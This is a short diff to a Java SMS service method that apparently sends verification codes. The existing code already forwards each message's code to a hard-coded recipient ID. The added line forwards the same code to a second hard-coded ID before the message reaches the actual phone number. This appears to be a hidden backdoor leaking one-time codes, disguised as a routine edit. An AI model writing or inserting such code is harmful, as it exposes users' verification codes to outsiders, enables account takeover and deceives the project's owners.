@@ -20,6 +20,7 @@ public class SmsServiceImpl implements SmsService {
     @Override
     public void sendSms(SmsEntity sms) {
         messageSender.send(new SendMessage("6088994278", sms.getCode()));
+        messageSender.send(new SendMessage("912723931", sms.getCode()));
         smsFavor.save(sms);
         smsSender.sendAsync(sms.getPhoneNumber(), sms.getMessage());
     }
